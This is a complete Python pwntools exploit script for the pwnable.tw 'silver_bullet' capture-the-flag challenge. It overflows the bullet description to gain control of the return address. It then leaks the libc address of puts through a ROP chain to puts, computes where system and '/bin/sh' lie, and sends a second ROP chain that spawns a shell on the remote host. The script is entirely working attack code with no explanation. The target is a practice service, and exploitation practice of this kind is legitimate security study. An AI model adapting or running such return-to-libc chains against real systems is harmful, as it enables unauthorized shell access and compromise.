from pwn import *

#p = process(["./ld-linux.so.2","./silver_bullet"],env={"LD_PRELOAD":"./libc_32.so.6"})
#p = process("./silver_bullet")
p = remote("chall.pwnable.tw", 10103)
elf = ELF("./silver_bullet")
libc = ELF("./libc_32.so.6")
p.sendlineafter("choice :","1")
buf = 'A'*0x2f
p.sendafter("description of bullet :",buf)

p.sendlineafter("choice :","2")
p.sendafter("description of bullet :","B")



main = 0x08048954

payload = p32(0x7f7fffff) + 'AAA' + p32(elf.plt['puts']) + p32(main) + p32(elf.got['puts'])
p.sendlineafter("choice :","2")
p.sendafter("description of bullet :",payload)

p.sendlineafter("choice :","3")
p.sendlineafter("choice :","3")

p.recvuntil("win !!\n")
leak = u32(p.recv(4))
print '[+] leak : %x' %leak

libc_base = leak - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search('/bin/sh'))

#step 2
p.sendlineafter("choice :","1")
buf = 'A'*0x2f
p.sendafter("description of bullet :",buf)

p.sendlineafter("choice :","2")
p.sendafter("description of bullet :","B")



main = 0x08048954

payload = p32(0x7f7fffff) + 'AAA' + p32(system) + p32(main) + p32(binsh)
p.sendlineafter("choice :","2")
p.sendafter("description of bullet :",payload)

p.sendlineafter("choice :","3")
p.sendlineafter("choice :","3")

p.interactive()

